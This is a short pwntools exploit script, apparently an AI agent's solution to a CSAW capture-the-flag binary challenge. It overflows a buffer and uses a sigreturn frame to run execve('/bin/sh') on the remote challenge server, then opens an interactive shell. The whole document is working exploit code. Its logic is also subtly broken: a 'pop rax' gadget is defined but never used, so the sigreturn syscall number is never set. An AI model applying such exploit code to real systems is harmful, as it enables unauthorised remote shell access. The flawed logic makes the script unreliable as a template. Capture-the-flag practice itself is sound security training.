from pwn import *

# Connect to the challenge server
p = remote("pwn.chal.csaw.io", 8000)

# Addresses
syscall_addr = 0x400185  # syscall; ret
pop_rax_ret = 0x40018a   # pop rax; ret
binsh_addr = 0x4001ca    # "/bin/sh" string

# Create SigReturn frame
frame = SigreturnFrame()
frame.rax = 59           # sys_execve
frame.rdi = binsh_addr   # "/bin/sh"
frame.rsi = 0            # argv = NULL  
frame.rdx = 0            # envp = NULL
frame.rip = syscall_addr # execute syscall

# Payload
payload = b"A" * 40      # padding to reach return address
payload += p64(syscall_addr)  # overwrite return address with syscall
payload += bytes(frame)  # sigcontext structure

# Send payload
p.send(payload)

# Get shell
p.interactive()
end_of_edit

